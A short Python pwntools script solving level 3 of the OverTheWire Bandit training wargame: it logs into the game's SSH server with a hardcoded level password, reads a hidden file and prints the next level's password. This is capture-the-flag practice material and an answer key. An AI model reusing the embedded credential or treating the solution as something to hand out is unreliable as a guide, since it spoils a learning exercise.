#!/usr/bin/env python
from pwn import *

log.info('overthewire.org - bandit3 exploit by SKane')

shell = ssh('bandit3', 'bandit.labs.overthewire.org', password='UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK', port=2220)

sh = shell.run('sh')

sh.sendline('cd inhere; cat .hidden')

log.success("Password for bandit4: " + sh.recvline())
